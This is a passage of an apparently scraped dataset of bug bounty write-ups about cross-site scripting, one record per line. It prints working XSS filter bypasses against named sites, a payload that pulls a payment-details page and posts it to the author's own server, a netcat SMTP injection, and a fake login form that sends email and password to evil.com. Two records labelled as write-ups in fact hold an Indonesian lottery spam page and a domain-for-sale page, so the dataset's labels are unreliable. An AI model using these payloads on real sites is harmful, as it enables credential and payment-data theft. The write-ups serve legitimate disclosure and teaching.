other bugs were also found in passing, which I was reporting, turning out-of-scope bugs to in-scope, if necessary. There were a lot of Open Redirects and even Improper Access Control bug for $5000, but the necessary vulnerabilities for the bundle could not be caught. The above-mentioned bug is quite interesting and dangerous, a whole subdomain was taken offline immediately after the report, perhaps in the future, I will reveal the report on the page hackerone.com/w2w if the program becomes public. A week later, I went through the results of the script for content discovery, where endpoint /verification was found, to which I did not attach much importance to at first, but I still set a script on it — the /verification/login subdirectory was found. After I went through the URL, the /verification/login/?redirect_uri=https://vulnerabledomain.com page was shown, which redirected to the redirect_uri value after logging in or immediately redirected if there was a session. After the flight to the intruder, open redirect protection bypass was discovered — vulnerabledomain.com@anotherdomain.com. I tried to escalate the bug to XSS — payload javascript:alert(1) failed, javascript:alert(1)// too. But payload javascript://https://vulnerabledomain.com/%250A1alert(1):0 shot, because due to the presence of https://vulnerabledomain, the parameter passed the white-list validation. Press enter or click to view image in full size *never gonna give you up song starts playing* After driving madly the mouse around the alert window (I always do this lol), I immediately switched to my cookie-based XSS. With the help of javascript:https://vulnerabledomain.com/%0A1?document%2ecookie%20%3d%20%27SID%3d137gf6g67f76fg6766123%5c%27-alert%28document%2edomain%29-%5c%27%3b%20expires%3dFri%2c%203%20Aug%202019%2020%3a47%3a11%20UTC%3b%20path%3d%2f%3b%20domain%3d%2evulnerabledomain%2ecom%3b%27%3a0, a cookie successfully set on *.vulnerabledomain.com. After visiting the page with the cookie, the coveted alert window has appeared! Double XSS, hooray! :) I updated a report and was waiting for an answer. Press enter or click to view image in full size On the same day, a nice catch arrived from the triager (if we can call it like this), and the bounty was paid. God bless the companies that pay on the triage! For the DOM-based XSS, with which I installed the cookie, the bounty also came to my account. Press enter or click to view image in full size Testing results: $1000 + $1000 + $200 (OR)+ $100(OR) = $2300 This program has been operating for more than a year, but in less than a month I was able to take first place in it and get away with testing quite far, I tried to fuzzing most endpoints, evaluate their reaction, understand how the site works and even tested the desktop application. This bug bounty has become one of my favorite programs on HackerOne. I hope you will find the same one too! :) Also, precisely this program gave me a new boost (mail.ru is the first) and with the help of it, I got to 2500 reputation (hello hoodie) and got 36th place in the leaderboard for reputation in 90 days, which should give me fresh private invites. Though it seems that private invites come regardless of my presence in the leaderboard, I often cancel old ones and wait for new ones in the queue. Short brief: Cookie-based XSS is quite exploitable. If you try and dig a little deeper, you can get a bounty instead of n/a, signal destruction and -5 reputation. If the program is old, it doesn’t mean that it doesn’t have vulnerabilities. If the fruitages hang on a tree for a long time, low-hanging fruits will be picked and immediately taken home (subdomain takeovers, etc.). Other fruits continue to hang, but higher. In order to get them, you need to make some effort. Sometimes it‘s better to focus on one program for a long time, find as many vulnerabilities as possible and constantly monitoring it. It is better to find the program that you prefer and break it. Perseverance and the desire to understand how a web application works, as well as certain functionalities and their interaction with each other, is the key to successful finding vulnerabilities in a bug bounty. If you want to stay in touch with my latest articles and news, I recommend subscribing on twitter profile . Security Xss Attack Vulnerability Information Security Bug Bounty -- -- 1 Written by Max 720 followers · 17 following Impassioned about finding vulnerabilities in web apps: https://securityrise.com Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://visat.me/security/reflected-xss-in-tokopedia-train-ticket/", "title": "Reflected XSS in Tokopedia Train Ticket - Visat.me", "friendly_explanation": "This is a bug bounty writeup from https://visat.me/security/reflected-xss-in-tokopedia-train-ticket/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS in Tokopedia Train Ticket - Visat.me Visat .me Security Blog Poetry Security Blog Poetry 15 June 2019 #security Reflected XSS in Tokopedia Train Ticket Bypassing XSS filter via two reflected parameters. TL;DR There was an XSS filter that would encode GET parameter if it contains < character followed by > character. The filter could be bypassed by splitting </script/> closing tag into </script/ and > in two reflected parameters. Old Bug? Back in May 2018, I found a reflected XSS in Tokopedia train ticket. It was a simple reflected XSS in JavaScript context. I reported to Tokopedia security team and they told me my report was duplicate. I didn't bother to check if it was already fixed or not. In March this year, I was scrolling through my old emails and found the report. I re-tested, fuzzed here and there. Eventually, I found the vulnerability on the same page. Tag Filtering If you search a train ticket in Tokopedia , you will be redirected to a URL something like this https://tiket.tokopedia.com/kereta-api/search/Jakarta-Gambir-GMR/Bandung-Bandung-BD?adult=1&infant=0&trip=departure&dep_date=16-09-2019&ori=GMR&dest=BD . It stores all GET parameters to a JavaScript variable, dataJs.query . All GET parameters are stored in dataJs.query . It lives in the JavaScript context. So if you want to trigger an XSS you have to either: Break out of JavaScript context. Insert </script><script>alert(1)</script> in one of the parameters. This will malform the HTML parser to close the context, causing previous JavaScript execution to error (we don't care!) and start a new attacker-controlled script context. Break out of JavaScript variable, dataJs.query . Insert \"}; alert(1); // in one of the parameters. This will cause JavaScript parser to close the variable, execute our controlled script directly, and ignore the rest. My previous report was using the first method. The server didn't encode dangerous characters, such as < into &lt; . However, it encoded \" into \\\" , and \\ into \\\\ , so the second method couldn't be used. Then I noticed a strange behavior. The encoding used in ori and dest parameters was different than the rest. Notice how in other parameters, \" character got encoded into %22 . Different encoding was used. I tried with another dangerous character, > . > was not encoded in both parameters. Interesting, it was not encoded in ori and dest parameters. What if I insert both < and > characters? >< was not encoded. <> was encoded. Apparently the server did sanitize the parameters, but only if <.*> appears in the parameter! Bypassing the Filter First I thought yeah that's it, it can't be exploited. But then I was googling some XSS payload and found this awesome repository . It says: You can use // to close a tag instead of > . Let's try it. An error occurred. Chrome threw an error: Uncaught SyntaxError: Invalid or unexpected token . Okay I knew I was making a progress. Then I tried to insert XSS payload. XSS payload inserted. It didn't work, JavaScript parser doesn't consider it as a closing tag. I re-read the XSS payload repository again and found this on \"Bypass tag blacklisting\" section, </script/> . We knew the fact that we couldn't insert < and > characters on a same parameter because it would be encoded. But what if we separate </script/ and > on different parameters (i.e. ori and dest )? There would be other characters between them, in this case </script/\",\"dest\":\"> . Is that still a valid closing tag? XSS auditor highlighting the XSS payload. Turned out it was a valid closing tag! Chrome XSS auditor blocked the page, indicating there was a reflected XSS. Then I tried it on Firefox, and it worked! Here is the full payload I used: https://tiket.tokopedia.com/kereta-api/search/Jakarta-Gambir-GMR/Bandung-Bandung-BD?dep_date=26-06-2019&adult=1&infant=0&trip=departure&ori=</script//&dest=><svg/onload=alert(document.location.href))// . Proof of concept. Going Deeper Session cookie in Tokopedia (named _SID_Tokopedia ) is HTTP-only so we can't steal the session via XSS. But it turned out that the session cookie was accidentally stored in a JavaScript variable named dataSession.session.cookies . This defeats the purpose of HTTP-only attribute on the cookie. By exploiting the XSS, an attacker can steal victim's session as demonstrated on proof of concept video below. Timeline 28/03/2019 - Reported the vulnerability to Tokopedia security team. 08/04/2019 - Sent a follow-up email. The vulnerability was fixed and the report was valid with high severity. 11/06/2019 - Tokopedia rewarded IDR 3.000.000 and a certificate. Related posts CVE-2019-19502 Remote code execution in Image Uploader and Browser for CKEditor 4.1.8 and earlier. Dec 22, 2019 #security Visat.me © 2023"}
{"source_url": "https://websecblog.com/vulns/googleplex-com-blind-xss/", "title": "XSSing Google Employees — Blind XSS on googleplex.com - Web Security Blog", "friendly_explanation": "This is a bug bounty writeup from https://websecblog.com/vulns/googleplex-com-blind-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSSing Google Employees — Blind XSS on googleplex.com - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me XSSing Google Employees — Blind XSS on googleplex.com by Thomas Orlita Vulnerabilities June 12, 2019 January 2, 2023 Google is an enormous company and it’s dependent on thousands of suppliers to keep it running. And since it needs some way to keep track and pay their suppliers, it offers a public online tool where suppliers upload their invoices to Google. It is called Google Invoice Submission Portal and can be found on gist-uploadmyinvoice.appspot.com . Google Invoice Submission Portal The first thing you’ve probably noticed is that the website is hosted on the appspot.com domain, which is publicly available for hosting Google App Engine projects. Google often uses it for building some of their websites, where in the end the production version is transferred over to google.com or some other domain. In this case, they likely forgot to publish the Invoice Upload site hosted on appspot.com to google.com . Uploading invoices The first thing it asks us to enter is a Purchase Order Number . It doesn’t really matter what we enter, just type a random number and click on the Search button. Then it wants to select an organization related to the invoice. This determines what country will the invoice be processed in. Again, just select some option and click on Submit . Now we can see a form with multiple inputs, namely for email , invoice number , invoice date, and a file select button for uploading the actual invoice in a PDF format. Finding the vulnerabilities I tried filling these text fields with various XSS payloads hoping that somewhere in their invoices dashboard they haven’t correctly escaped the inputs which would trigger a blind XSS that would send me a notification. But this wasn’t the case. I haven’t received anything so the text fields were most likely handled correctly. Apart from text input, there’s also the input for selecting a PDF file. But it’s configured so that only PDF files can be selected to upload. Since this is just a front-end validation, it doesn’t stop us from changing the file type when sending the upload POST request. Once we select any PDF file, an upload request is fired. We can intercept the request using a web proxy debugger and change the filename and the contents from .pdf to .html . POST request for uploading the PDF file First, we change the filename property to test.html , the Content-Type to text/html and the body to an XSS payload. In the payload, I’ll use a <script> tag with src pointing to an endpoint on my domain that sends me an email every time it’s loaded. I’m using ezXSS for logging these blind XSS requests. Now the HTML file has been attached to the form and we can click on the Submit Invoices button to send the form. Executing the blind XSS Some days later I’ve received a notification that a blind XSS has been executed on the googleplex.com domain. Google uses googleplex.com for hosting internal websites and apps. If you try to go to the domain, you’ll be redirected to a Google Corp login page (also know as MOMA login page) – which requires a valid google.com account. That means it’s accessible only by Google employees. googleplex.com blind XSS details The DOM of the page matches the XSS payload that was put in place of the PDF file. We can see that this URL is used for displaying a PDF file. But since the Content-Type of the uploaded file was changed from application/pdf to text/html , it displayed and rendered the XSS payload instead of the PDF. Impact Executing a custom JavaScript code on this googleplex.com subdomain allows the attacker to gain access to Google’s invoices and other sensitive information. Since the Google Employee is logged in using their company account, it should be possible to access other internal sites on their behalf as well. Update : The previous paragraph is incorrect. I’ve received more information from Google’s Security Team: Access to a single googleplex.com app does not give you access to any other googleplex.com apps, they are all independent from each other and isolated and the credentials and cookies can’t be stolen or used against other sites. This means the attacker could still access the subdomain where invoices are handled, but access to other apps on googleplex.com wasn’t possible due to CORS. Fixing the vulnerability I’ve sent details about this vulnerability to Google as soon as possible. After adding some additional information, four days later I’ve received an update that the report has been accepted. After about a month later I’ve been able to confirm that it has been fixed. Although after it’s been fixed an XSS was still fired, it wasn’t on googleplex.com , but on storage.googleapis.com — which acts as a sandbox domain and is as well used (also like g oogleusercontent.com ) for storing uploaded user content. The XSS is now on a sandboxed domain where the XSS poses no risk for the user/employee. Timeline 2019-02-21 Vulnerability reported 2019-02-22 Priority changed to P2 2019-02-22 Added more information 2019-02-25 Accepted and priority changed to P1 2019-03-06 Reward issued 2019-03-26 A fix has been implemented 2019-04-11 Issue marked as fixed Written by Thomas Orlita Follow me on Twitter: @ThomasOrlita / Mastodon: @ThomasOrlita@infosec.exchange Post Navigation Previuos Article Previous Article: Inserting arbitrary files into anyone’s Google Earth Studio Projects Archive Next Article Clickjacking DOM XSS on Google.org Related Articles Inserting arbitrary files into anyone’s Google Earth Studio Projects Archive by Thomas Orlita in Vulnerabilities Reflected XSS in Google Code Jam by Thomas Orlita in Vulnerabilities 5 Different Vulnerabilities in Google’s Threadit by Thomas Orlita in Vulnerabilities Public Bucket Allowed Access to Images on Upcoming Google Cloud Blog Posts by Thomas Orlita in Vulnerabilities Web Security Blog by Thomas Orlita Digital Download | Developed by Rara Theme . Powered by WordPress ."}
{"source_url": "https://www.amolbaikar.com/xss-on-facebooks-acquisition-oculus-cdn-server/", "title": "ALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar", "friendly_explanation": "This is a bug bounty writeup from https://www.amolbaikar.com/xss-on-facebooks-acquisition-oculus-cdn-server/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar INTERNAL FEEDBACK Masukan Lebih Murah Di App Download Aplikasinya dan Belanja Sekarang! Belanja di App banyak untungnya: Banyak Vouchernya Produk Eksklusif di App Rekomendasi Hanya Untukmu Paling Pertama Dapat Promo Success! Please check your phone for the download link MENJADI SELLER customer care Pusat Bantuan Order & Pembayaran Pembatalan Pesanan Pengiriman Pengembalian Barang & Dana Hubungi kami di Live Chat (24 Jam) LACAK PESANAN LACAK PESANAN Nomor pesanan: Untuk bantuan silakan, Klik disini Panel Akun Pesanan Saya Wishlist dan Toko yang Saya Ikuti Ulasan Saya Pengembalian & Pembatalan Logout Kategori Peralatan Elektronik Aksesoris Elektronik Fashion & Aksesoris Wanita Fashion & Aksesoris Pria Fashion & Aksesoris Anak Kesehatan & Kecantikan Bayi & Mainan TV & Elektronik Rumah Keperluan Rumah & Gaya Hidup Kebutuhan Rumah Tangga Olahraga & Outdoor Otomotif Handphone Laptop Desktop Kamera Game Console Gadget Tablet Aksesoris Handphone Aksesoris Komputer Audio Aksesoris Berteknologi Aksesoris Kamera Penyimpanan Data Printer Aksesoris Tablet Komponen Komputer Pakaian Wanita Baju Muslim Lingerie, Baju Tidur & Santai Sepatu Wanita Aksesoris Tas Wanita Perhiasan Wanita Jam Tangan Wanita Pakaian Pria Baju Muslim Pakaian Dalam Sepatu Pria Aksesoris Tas Pria Perhiasan Pria Jam Tangan Pria Pakaian Anak Laki-laki Pakaian Anak Perempuan Pakaian Anak Muslim Laki-Laki Pakaian Anak Muslim Perempuan Sepatu Anak Laki-laki Sepatu Anak Perempuan Tas Anak Perhiasan Anak Jam Tangan Anak Perawatan Kulit Makeup Perawatan Rambut Perawatan Tubuh Perawatan Diri Parfum Alat Kecantikan Suplemen Makanan Alat Medis Sexual Wellness Perawatan Pria Popok Dewasa Ibu & Anak Popok Sekali Pakai Makanan Bayi & Balita Pakaian & Aksesoris Perlengkapan Menyusui Perlengkapan Bayi Kamar Bayi Perawatan Bayi Mainan Mainan Elektronik & RC Mainan Olahraga & Luar Ruangan Mainan Bayi & Balita TV & Perangkat Video Peralatan Dapur Kecil Elektronik Rumah Besar Penyejuk dan Pembersih Udara Penghisap Debu & Perawatan Lantai Alat Perawatan Diri Aksesoris & Suku Cadang Aksesoris Televisi Home Entertainment Dekorasi Rumah Furnitur Kelengkapan Tempat Tidur Penerangan Peralatan Mandi Alat Dapur Binatu & Alat Kebersihan Perkakas & Perbaikan Rumah Kebun & Luar Ruangan Alat Tulis & Kerajinan Media, Musik & Buku Minuman Bahan & Bumbu Masakan Cokelat, Camilan & Permen Makanan Sarapan, Sereal & Selai Buah & Sayur Kebutuhan Rumah Tangga Makanan Hewan Peliharaan Aksesoris Hewan Peliharaan Kesehatan Hewan Peliharaan Baju Olahraga Pria Baju Olahraga Wanita Sepatu Olahraga Pria Sepatu Olahraga Wanita Camping dan Hiking Peralatan Memancing Olahraga Sepeda Olahraga Air Gym, Yoga & Fitness Olahraga Raket Perlengkapan Olahraga Perlengkapan Sepak Bola Suku Cadang & Peralatan Mobil Aksesoris Interior Mobil Aksesoris Exterior Mobil Kamera Mobil, Audio & Video Perawatan & Pengkilat Mobil Ban & Velg Mobil Oli & Cairan Mobil Perlengkapan Berkendara & Helm Suku Cadang & Peralatan Motor Aksesoris & Elektronik Motor Ban, Velg, Oli & Cairan Motor Kendaraan ALEXISTOGEL SITUS TOGEL BANDAR TOGEL TOGEL ONLINE Kategori Peralatan Elektronik Aksesoris Elektronik Fashion & Aksesoris Wanita Fashion & Aksesoris Pria Fashion & Aksesoris Anak Kesehatan & Kecantikan Bayi & Mainan TV & Elektronik Rumah Keperluan Rumah & Gaya Hidup Kebutuhan Rumah Tangga Olahraga & Outdoor Otomotif Handphone Laptop Desktop Kamera Game Console Gadget Tablet Aksesoris Handphone Aksesoris Komputer Audio Aksesoris Berteknologi Aksesoris Kamera Penyimpanan Data Printer Aksesoris Tablet Komponen Komputer Pakaian Wanita Baju Muslim Lingerie, Baju Tidur & Santai Sepatu Wanita Aksesoris Tas Wanita Perhiasan Wanita Jam Tangan Wanita Pakaian Pria Baju Muslim Pakaian Dalam Sepatu Pria Aksesoris Tas Pria Perhiasan Pria Jam Tangan Pria Pakaian Anak Laki-laki Pakaian Anak Perempuan Pakaian Anak Muslim Laki-Laki Pakaian Anak Muslim Perempuan Sepatu Anak Laki-laki Sepatu Anak Perempuan Tas Anak Perhiasan Anak Jam Tangan Anak Perawatan Kulit Makeup Perawatan Rambut Perawatan Tubuh Perawatan Diri Parfum Alat Kecantikan Suplemen Makanan Alat Medis Sexual Wellness Perawatan Pria Popok Dewasa Ibu & Anak Popok Sekali Pakai Makanan Bayi & Balita Pakaian & Aksesoris Perlengkapan Menyusui Perlengkapan Bayi Kamar Bayi Perawatan Bayi Mainan Mainan Elektronik & RC Mainan Olahraga & Luar Ruangan Mainan Bayi & Balita TV & Perangkat Video Peralatan Dapur Kecil Elektronik Rumah Besar Penyejuk dan Pembersih Udara Penghisap Debu & Perawatan Lantai Alat Perawatan Diri Aksesoris & Suku Cadang Aksesoris Televisi Home Entertainment Dekorasi Rumah Furnitur Kelengkapan Tempat Tidur Penerangan Peralatan Mandi Alat Dapur Binatu & Alat Kebersihan Perkakas & Perbaikan Rumah Kebun & Luar Ruangan Alat Tulis & Kerajinan Media, Musik & Buku Minuman Bahan & Bumbu Masakan Cokelat, Camilan & Permen Makanan Sarapan, Sereal & Selai Buah & Sayur Kebutuhan Rumah Tangga Makanan Hewan Peliharaan Aksesoris Hewan Peliharaan Kesehatan Hewan Peliharaan Baju Olahraga Pria Baju Olahraga Wanita Sepatu Olahraga Pria Sepatu Olahraga Wanita Camping dan Hiking Peralatan Memancing Olahraga Sepeda Olahraga Air Gym, Yoga & Fitness Olahraga Raket Perlengkapan Olahraga Perlengkapan Sepak Bola Suku Cadang & PeralatanMobil Aksesoris Interior Mobil Aksesoris Exterior Mobil Kamera Mobil, Audio & Video Perawatan & Pengkilat Mobil Ban & Velg Mobil Oli & Cairan Mobil Perlengkapan Berkendara & Helm Suku Cadang & Peralatan Motor Aksesoris & Elektronik Motor Ban, Velg, Oli & Cairan Motor Kendaraan ALEXISTOGEL SITUS TOGEL BANDAR TOGEL TOGEL ONLINE ALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar 8.744.154 Penilaian 62.487.778 : ALEXISTOGEL ALEXISTOGEL merupakan salah satu situs bandar togel online terpercaya yang terkenal di kalangan togelmania. Hal yang membuat fenomena ini bisa terjadi adalah setiap withdraw yang diberikan selalu dibayar lunas tanpa ditunda. Jenis permainan yang beragam dengan peluang menang tinggi juga menjadi bagian daya tarik dari situs ini. Serta hal yang tidak kalah penting adalah sistem pelayanan 24 jam yang selalu siap dalam membantu menyelesaikan kendala. Trending Tags: alexistogel alexis togel situs togel bandar togel terpercaya bandar togel resmi bandar togel bandar togel online bandar terpercaya situs togel online situs togel terpercaya situs togel resmi situs togel terbesar togel online Rp.7.777 Rp.77.00 -77% LOGIN DAFTAR Pilihan pengiriman DKI Jakarta, Kota Jakarta Pusat, Kemayoran UBAH Standar Dijamin tiba 10 Nov - 12 Nov. Dapatkan LazRewards Rp10.000 jika pesananmu terlambat Rp8.888 Bayar di tempat berlaku Pengembalian & Garansi Berubah Pikiran 7 Hari Gratis Pengembalian Tidak ada garansi Dijual oleh ALEXISTOGEL Rating Toko 98% Pengiriman Tepat Waktu 100% Chat Dibalas 100% Layanan Pelanggan Pusat Bantuan Cara Pembelian Pengiriman Kebijakan Produk Internasional Cara Pengembalian Ada pertanyaan? Hubungi kami di live chat (24 Jam) Jelajahi Lazada Tentang Lazada Afï¬liate Program Karir Syarat & Ketentuan Kebijakan Privasi Press & Media Jual Di Lazada Lazada Security Intellectual Property Protection Go where your heart beats Download the App Metode Pembayaran Jasa Pengiriman Verified by Lazada Southeast Asia Follow Us Â© Lazada 2025 Layanan Pelanggan Pusat Bantuan Cara Pembelian Pengiriman Kebijakan Produk Internasional Cara Pengembalian Ada pertanyaan? Hubungi kami di live chat (24 Jam) Jelajahi Lazada Tentang Lazada Afï¬liate Program Karir Syarat & Ketentuan Kebijakan Privasi Press & Media Jual Di Lazada Lazada Security Intellectual Property Protection Always Better Download the App Metode Pembayaran Jasa Pengiriman Verified by Lazada Southeast Asia Follow Us © ALEXISTOGEL 2025 by-Seo Campak"}
{"source_url": "https://medium.com/@osamaavvan/bypassing-xss-filter-and-stealing-user-credit-card-data-100f247ed5eb", "title": "Bypassing XSS filter and Stealing User Payment Data | by Osama Avvan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@osamaavvan/bypassing-xss-filter-and-stealing-user-credit-card-data-100f247ed5eb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypassing XSS filter and Stealing User Payment Data | by Osama Avvan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bypassing XSS filter and Stealing User Payment Data Osama Avvan 2 min read · Jun 17, 2019 -- 2 Listen Share So here is another writeup about how I bypassed XSS filter and created a payload to get user credit card data. It was a private program on bugcrowd, let’s just say it was named Redact. Here is the URL https://www.redact.com/us/en/my-account/quotes?searchCriteria=QuoteID&amountOperator=equal&searchValue= XSS The parameter searchValue was reflected inside an input feild. So by putting an “ I was able to break out of the input field, after that, I tried the most basic payload “><script>alert(1)</script>, but unfortunately my request was blocked by WAF. so I tried another payload “onmouseover=alert(1) and again my request was blocked by WAF. After some playing around, I found out that anything between <> was being removed, so if type something like this “o<x>nmouseover=alert<x> 1 // <x> will be removed leaving it only with “onmouseover=alert(1)// and finally i was able to pop up a XSS. Now there was a page which allows the user to view their payment Data https://www.redact.com/us/en/smbpro/my-account/payment-details , so I thought it would be a good idea to include this in my report that how I can get users credit card data with this XSS. So the Payload for stealing user credit card data was this “o<x>nmouseover=$.get<x>(‘https://www.redact.com/us/en/my-account/payment-details',function<x>(res){$.post<x>('https://osamaavvan.000webhostapp.com/r.php',{res})})// As the page was using jQuery, I requested the whole payment data page with $.get() and posted the page content to my server with $.post(), so now with this payload, I was able to get users payment data: https://www.redact.com/us/en/my-account/quotes?searchCriteria=QuoteID&amountOperator=equal&searchValue=“o<x>nmouseover=$.get<x>(‘https://www.redact.com/us/en/my-account/payment-details',function<x>(res){$.post<x>('https://osamaavvan.000webhostapp.com/r.php',{res})})// Press enter or click to view image in full size But unfortunately, my report got duplicate. Press enter or click to view image in full size Thank You for Reading. Security Researchers Bug Hunting Bug Bounty Xss Attack Bugcrowd -- -- 2 Written by Osama Avvan 1.1K followers · 0 following Security Researcher, ❤️ To Code. Find me at: https://twitter.com/osamaavvan Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002", "title": "What do Netcat, SMTP and self XSS have in common? Stored XSS | by Plenum | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWhat do Netcat, SMTP and self XSS have in common? Stored XSS | by Plenum | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication What do Netcat, SMTP and self XSS have in common? Stored XSS Plenum 2 min read · Jul 16, 2019 -- 1 Listen Share If you are reading this you are probably wondering what is this? is this some kind of a joke? The answer is No, and it is not a clickbait, this is the story of chaining small issues and pivoting from a self XSS to a fully blown Stored XSS. Press enter or click to view image in full size JUST A RANDOM PHOTO T he journey began when i started hacking on a private program, and while doing my research i came across a self XSS issue which hey were aware of and it was explicitly out of scope. So i kept digging and started to learn how the app worked, it had CRM and other related stuff which is not really important for now. The app had multiple parts and one of them was client management with regular functionalities like create/delete/modify clients, create/attach invoices… the self xss existed in the information fields of the client’s view. <a tlclick=”sendEmail(&quot;email_here&quot;)”>email_here</a> By adding a simple ‘ to the email i was able to break the html and then add my own attributes. After some more digging i found out that if you send an email to the invoice email address the app would check if the email address of the sender existed in the client’s database and if found it would create a new ticket for that client but what if we send an email from a non client address? A new client is created along side with the new ticket. Now since i can control parts of client information (email address), i need to be able to send really miss formed emails and the easiest way to do that is to use NETCAT. So i just opened a new terminal queried for their email server and started building the exploit. First i had to build a working XSS then i had to figure out which characters break the SMTP syntax and encode them, ended up with a an email like this ‘onmouseover=’alert&#40localStorage.oauth&#41'@plenumsec.com The final attack looked something like this nc -C mxa.mailgun.org 25 >HELO plenumsec.com >MAIL FROM: <'onmouseover='alert&#40localStorage.oauth&#41'@plenumsec.com> >RCPT TO: <random@target.com> >DATA From: Attacker <'onmouseover='alert&#40localStorage.oauth&#41'@plenumsec.com> To: Victim <random@target.com> Subject: Urgent Date: Wed, 26 Sep 2018 14:21:26 -0400 Hello, This is a stored xss poc. Goodbye. Now an attacker would just wait for the employee to visit the client management page or perform any action that includes the attacker’s email. The company email was completely guessable and thus could be targeted by just bruteforcing and automating the process. One would argue that this attack could have been avoided by implementing SPF but sometimes security is not convenient for businesses so they have to make compromises. Thanks for reading, Regards, Plenum Security Infosec Bug Bounty -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Plenum 342 followers · 3 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@saadahmedx/self-xss-to-evil-xss-bcf2494a82a4", "title": "Self XSS To Evil XSS. Hi guy I hope you all are fine this POC… | by Saad Ahmed | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@saadahmedx/self-xss-to-evil-xss-bcf2494a82a4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSelf XSS To Evil XSS. Hi guy I hope you all are fine this POC… | by Saad Ahmed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Self XSS To Evil XSS Saad Ahmed 3 min read · Jun 20, 2019 -- 5 Listen Share Hi guy I hope you all are fine this POC is all about how I convert the Self XSS To Evil XSS so let assume the site PRIVATE.COM The first step simply sign-up and login to the account & start playing with the change account details functionality after some time I find out that the first name field is vulnerable to xss but the problem is this is self stored xss so I need to convert this xss to exploit other users I check the 1st method through CSRF but there is a CSRF token in the account update functionality so this method fail & then I remember GEEK BOY POC . So simple created the html + js code to steal email & pass of victim. <!DOCTYPE html> <html> <head> <title>XSS</title> </head> <body> <center><div class=\"panel-body\"> <h3>Something Went Wrong Please Login Again</h3> <div class=\"login-group\"> <label for=\"email\" class=\"control-label\">Email</label> <input id=\"Vemail\" class=\"input span12\" name=\"email\" required=\"\" type=\"email\" value=\"\" autofocus=\"\"> </div> <div class=\"login-group\"> <label for=\"password\" class=\"control-label\">Password</label> <input id=\"Vpass\" class=\"input span12\" name=\"password\" required=\"\" type=\"password\" value=\"\"> <div class=\"alert alert-error error hide\" id=\"error_missingPassword\">Please enter your password</div> </div> <button class=\"action-button btn btn-primary login-button\" buttontype=\"login\" type=\"submit\" onclick=\"myFunction()\">Login</button> </div> <script> function myFunction() { var x = document.getElementById(\"Vemail\").value; var y = document.getElementById(\"Vpass\").value; var pwd = x + \":\" + y; alert(pwd); window.location = \"https://evil.com/\" + pwd; } </script> </body> </html> This is a simple html code with 2 input fields with 1 button asking for Email and Password & the JS code simply get the input field value & send it to attacker server and upload the code the web host. Press enter or click to view image in full size Simply use I frame to load the code from web host. Press enter or click to view image in full size This is how i look like. Press enter or click to view image in full size Everything is good now all I need is to send the user this form. <html> <body> <form action=\"https://attacker.com/login/submit\" method=\"POST\"> <input type=\"hidden\" name=\"email\" value=\"email@gmail.com\" /> <input type=\"hidden\" name=\"password\" value=\"password\" /> <input type=\"submit\" value=\"Submit request\" /> </form> </body> </html> This is simply make victim to login in my account without knowing him & when he login in my account he see the msg Something Went Wrong with input fields & try to login when he try the JS code simply get the email & pass victim enter and send it to attacker server Press enter or click to view image in full size I hope you like it :) ./Logout JavaScript -- -- 5 Written by Saad Ahmed 636 followers · 1 following Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://learn.hackersid.com/2019/08/stored-xss-on-laporbugid.html", "title": "HackersID.com is for sale | HugeDomains", "friendly_explanation": "This is a bug bounty writeup from https://learn.hackersid.com/2019/08/stored-xss-on-laporbugid.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHackersID.com is for sale | HugeDomains Skip to main content Search +1-303-893-0552 Home FAQs About us Contact us My account My favorites Shopping cart HackersID.com Buy now: $6,295 ▸ Buy now Processing or ▸ Start payment plan Processing Only $262.29/mo. for 24 months See details 30-day money back guarantee Take immediate ownership Safe and secure shopping HackersID.com This domain is for sale: $6,295 Buy now for $6,295 or pay $262.29 per month for 24 months ▸ Buy now Processing or ▸ Start payment plan Processing Make 24 monthly payments Pay 0% interest Start using the domain today. See details Make 24 monthly payments Pay 0% interest Start using the domain today. See details This domain is for sale: $6,295 ▸ Buy now Processing or ▸ Start payment plan Processing Only $262.29/mo. for 24 months See details Favorite Questions? Talk to a domain expert: 1‑303‑893‑0552 Enjoy zero percent financing Quick delivery of the domain Safe and secure shopping Since 2005, we've helped thousands of people get the perfect domain name J The gentleman that helped us was very excellent and patient. Thank you! - Jason Cooper, December 3, 2024 E Easy to follow the steps to manage my domain. - Eric Kuan, November 27, 2024 M Very easy, step-by-step instructions to purchase a domain. AWESOME that you have payment plan and even moreso that it's interest-free. Very smart, made it 